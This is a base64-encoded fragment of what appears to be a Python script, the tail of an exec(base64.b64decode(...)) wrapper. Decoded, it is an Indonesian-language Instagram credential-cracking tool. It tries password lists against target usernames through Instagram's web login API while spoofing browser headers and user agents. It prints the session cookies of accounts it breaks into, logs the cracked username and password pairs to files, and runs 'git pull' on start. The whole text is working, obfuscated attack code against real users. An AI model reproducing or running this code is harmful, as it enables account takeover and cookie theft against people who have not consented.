GNlcHRpb24gYXMgZTpwcmludChlKQogICAgICAgIGV4aXQoZidcbiAqIGNyYWNrIHNlbGVzYWkgT2s6e2xlbihvayl9IENQOntsZW4oY3ApfScpCgogICAgZGVmIGFjb3VudChzZWxmLCB1c2VybmFtZSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBsaW5rID0gcmVxdWVzdHMuU2Vzc2lvbigpLmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL3VzZXJzL3dlYl9wcm9maWxlX2luZm8vP3VzZXJuYW1lPSVzIiUodXNlcm5hbWUpLGhlYWRlcnM9eyJ1c2VyLWFnZW50Ijp1YV9pZywieC1pZy1hcHAtaWQiOic5MzY2MTk3NDMzOTI0NTknfSkuanNvbigpWyJkYXRhIl1bInVzZXIiXQogICAgICAgICAgICBuYW1hID0gbGluay5nZXQoImZ1bGxfbmFtZSIpCiAgICAgICAgICAgIG1lbmdpa3V0ID0gbGluay5nZXQoImVkZ2VfZm9sbG93IikuZ2V0KCJjb3VudCIpCiAgICAgICAgICAgIHBlbmdpa3V0ID0gbGluay5nZXQoImVkZ2VfZm9sbG93ZWRfYnkiKS5nZXQoImNvdW50IikKICAgICAgICAgICAgcG9zdGluZ2FuID0gbGluay5nZXQoImVkZ2Vfb3duZXJfdG9fdGltZWxpbmVfbWVkaWEiKS5nZXQoImNvdW50IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIG5hbWEgPSAiJy0nIgogICAgICAgICAgICBtZW5naWt1dCA9ICInLSciCiAgICAgICAgICAgIHBlbmdpa3V0ID0gIictJyIKICAgICAgICAgICAgcG9zdGluZ2FuID0gIictJyIKCiAgICAgICAgcmV0dXJuIG5hbWEsIHBlbmdpa3V0LCBtZW5naWt1dCwgcG9zdGluZ2FuCgogICAgZGVmIFVzZXJBZ2VudChzZWxmKToKICAgICAgICB6ID0gcmFuZG9tLnJhbmRpbnQoMzAwMCw0MDAwKQogICAgICAgIGkgPSByYW5kb20ucmFuZGludCg1MCw3MCkKICAgICAgICB4ID0gcmFuZG9tLnJhbmRpbnQoODAsMTIwKQogICAgICAgIHUgPSBmbG9hdChyYW5kb20ucmFuZGludCgxLDEyKSkKICAgICAgICBhID0gcmFuZG9tLnJhbmRpbnQoNiwxMikKICAgICAgICByZXR1cm4gKGYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHtyYW5kb20ucmFuZGludCg2LDEyKX07IEluZmluaXggWDY1M0MgQnVpbGQvUFBSMS4xODA2MTAuMDExKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBMaW51eC82MS4wLjMxNjMuMTI4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFhpYW9NaS9NaW50IEJyb3dzZXIvMy45LjMnKQoKICAgIGRlZiBjcmFjayhzZWxmLCB1c2VyLCBwd3gpOgogICAgICAgIGdsb2JhbCBvayxjcCxsb29wCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyIHtIfSoge059Y3JhY2sgOiB7bG9vcH0ve2xlbihzZWxmLmlkKX0gT0s6e2xlbihvayl9IENQOntsZW4oY3ApfScpO3N5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGZvciBwdyBpbiBwd3g6CiAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICBpID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICAgICAgICAgICBsaW5rID0gaS5nZXQoJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4nKQogICAgICAgICAgICAgICAgICAgaS5oZWFkZXJzLnVwZGF0ZSh7CiAgICAgICAgICAgICAgICAgICAgICAgICdIb3N0JzogJ3d3dy5pbnN0YWdyYW0uY29tJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQtbGVuZ3RoJzogJzMyNycsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIkdvb2dsZSBDaHJvbWUiO3Y9IjEwNyIsICJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAgICAgICAgICAgICAgICAgICAneC1pZy1hcHAtaWQnOiAnMTIxNzk4MTY0NDg3OTYyOCcsCiAgICAgICAgICAgICAgICAgICAgICAgICd4LWlnLXd3dy1jbGFpbSc6ICcwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLAogICAgICAgICAgICAgICAgICAgICAgICAneC1pbnN0YWdyYW0tYWpheCc6ICcxMDA2NjMxMTcwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBzZWxmLlVzZXJBZ2VudCgpLAogICAgICAgICAgICAgICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnMzYwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgICAgICAgICAgICAgICAgICd4LXJlcXVlc3RlZC13aXRoJzogJ1hNTEh0dHBSZXF1ZXN0JywKICAgICAgICAgICAgICAgICAgICAgICAgJ3gtYXNiZC1pZCc6ICcxOTgzODcnLAogICAgICAgICAgICAgICAgICAgICAgICAneC1jc3JmdG9rZW4nOiBvcGVuKCdkYXRhL2NzcmZ0b2tlbi50eHQnLCdyJykucmVhZCgpLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2xpZ2h0JywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLAogICAgICAgICAgICAgICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsCiAgICAgICAgICAgICAgICAgICAgICAgICdyZWZlcmVyJzogJ3R0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLAogICAgICAgICAgICAgICAgICAgICAgICAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyxydTtxPTAuNixqdjtxPTAuNScKICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgJ2VuY19wYXNzd29yZCc6JyNQV0RfSU5TVEFHUkFNX0JST1dTRVI6MDp7fTp7fScuZm9ybWF0KGludCh0aW0oKSkscHcpLAogICAgICAgICAgICAgICAgICAgICAgJ3VzZXJuYW1lJzp1c2VyLAogICAgICAgICAgICAgICAgICAgICAgJ3F1ZXJ5UGFyYW1zJzone30nLAogICAgICAgICAgICAgICAgICAgICAgJ29wdEludG9PbmVUYXAnOidmYWxzZScsCiAgICAgICAgICAgICAgICAgICAgICAndHJ1c3RlZERldmljZVJlY29yZHMnOid7fScKICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgIFVsZmEgPSBpLnBvc3QoJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYXBpL3YxL3dlYi9hY2NvdW50cy9sb2dpbi9hamF4LycsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgIHN5ZGggPSBqc29uLmxvYWRzKFVsZmEudGV4dCkKIyAgICAgICAgICAgICAgICAgICBpLmhlYWRlcnMudXBkYXRlKHsneC1jc3JmdG9rZW4nOmkuY29va2llc1snY3NyZnRva2VuJ119KQogICAgICAgICAgICAgICAgICAgaWYgJ3VzZXJJZCcgaW4gc3lkaDoKICAgICAgICAgICAgICAgICAgICAgICBuYW1hLCBwZW5naWt1dCwgbWVuZ2lrdXQsIHBvc3RpbmdhbiA9IHNlbGYuYWNvdW50KHVzZXIpCiAgICAgICAgICAgICAgICAgICAgICAgY29raSA9ICI7Ii5qb2luKFtzdHIoeCkrIj0iK3N0cihlKSBmb3IgeCxlIGluIGkuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYnXHIge0h9KiAgLS0+IHt1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBwcmludChmJycnXHIKIHtIfSAgIOKAoiB7Tn11c2VybmFtZSAgOiB7SH17bmFtYX0KIHtIfSAgIOKAoiB7Tn1QZW5naWt1dCAgOiB7SH17cGVuZ2lrdXR9CiB7SH0gICDigKIge059TWVuZ2lrdXRpIDoge0h9e21lbmdpa3V0fQoge0h9ICAg4oCiIHtOfVBvc3RpbmdhbiA6IHtIfXtwb3N0aW5nYW59CiB7SH0gICDigKIge059Q29va2llcyAgIDoge0h9e2Nva2l9ICcnJykKICAgICAgICAgICAgICAgICAgICAgICBvcGVuKGYnT0svT0ste2luZG99LnR4dCcsJ2EnKS53cml0ZShmJ3t1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBvay5hcHBlbmQodXNlcikKICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludF91cmwnIGluIHN5ZGg6CiAgICAgICAgICAgICAgICAgICAgICAgbmFtYSwgcGVuZ2lrdXQsIG1lbmdpa3V0LCBwb3N0aW5nYW4gPSBzZWxmLmFjb3VudCh1c2VyKQogICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYnXHIge0t9KiAgLS0+IHt1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBwcmludChmJycnXHIKIHtIfSAgIOKAoiB7Tn11c2VybmFtZSAgOiB7SH17bmFtYX0KIHtIfSAgIOKAoiB7Tn1QZW5naWt1dCAgOiB7SH17cGVuZ2lrdXR9CiB7SH0gICDigKIge059TWVuZ2lrdXRpIDoge0h9e21lbmdpa3V0fQoge0h9ICAg4oCiIHtOfVBvc3RpbmdhbiA6IHtIfXtwb3N0aW5nYW59ICcnJykKICAgICAgICAgICAgICAgICAgICAgICBvcGVuKGYnQ1AvQ1Ate2luZG99LnR4dCcsJ2EnKS53cml0ZShmJ3t1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQodXNlcikKICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnNlbGYuY3JhY2sodXNlcixwd3gpCiAgICAgICAgbG9vcCArPTEKCmRlZiBmb2xkZXIoKToKICAgIHRyeTpvcy5ta2RpcignT0snKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeTpvcy5ta2RpcignQ1AnKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeTpvcy5ta2RpcignZGF0YScpCiAgICBleGNlcHQ6cGFzcwppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICBzaXMoJ2dpdCBwdWxsJykKICAgZm9sZGVyKCkKICAgbWVudSgp'))